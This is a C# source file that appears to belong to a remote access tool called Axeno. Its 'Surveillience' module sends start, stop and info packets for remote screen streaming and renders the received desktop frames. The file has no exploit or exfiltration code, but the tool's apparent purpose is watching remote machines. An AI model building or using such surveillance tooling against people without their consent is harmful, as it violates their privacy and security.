using Axeno.MessagePack;
using Axeno.Networking.Connection;

using Axeno.Views.Pages.ClientManager;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace Axeno.Networking.Functions.Surveillience
{
    internal class RemoteDesktopFunction
    {
        public static byte[] Start(int quality, int screen)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "StartStreaming";
            msgpack.ForcePathObject("Quality").AsInteger = quality;
            msgpack.ForcePathObject("Screen").AsInteger = screen;

            return msgpack.Encode2Bytes();
        }
        public static byte[] Stop()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "StopStreaming";
            return msgpack.Encode2Bytes();
        }
        public static byte[] GetInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "GetInfo";
            return msgpack.Encode2Bytes();
        }
        public void Handle(Client cli, MsgPack msgpack)
        {
            int screen = Convert.ToInt32(msgpack.ForcePathObject("Screens").AsInteger);
            for (int i = 0; i < screen; i++)
            {
                cli.Rdp.cmbScreens.Items.Add("Screen " + i);
            }
            cli.Rdp.cmbScreens.SelectedIndex = 0;
        }
        public void HandleStream(Client cli, MsgPack msgpack)
        {
            byte[] buffer = msgpack.ForcePathObject("Stream").GetAsBytes();
            using (MemoryStream ms = new MemoryStream(buffer, 0, buffer.Length))
            {
                BitmapImage image = new BitmapImage();
                image.BeginInit();
                image.StreamSource = ms;
                image.CacheOption = BitmapCacheOption.OnLoad;
                image.EndInit();

                WriteableBitmap writeableBitmap = new WriteableBitmap(image);

                cli.Rdp.imgdesktop.Source = writeableBitmap;
            }
        }
    }
}
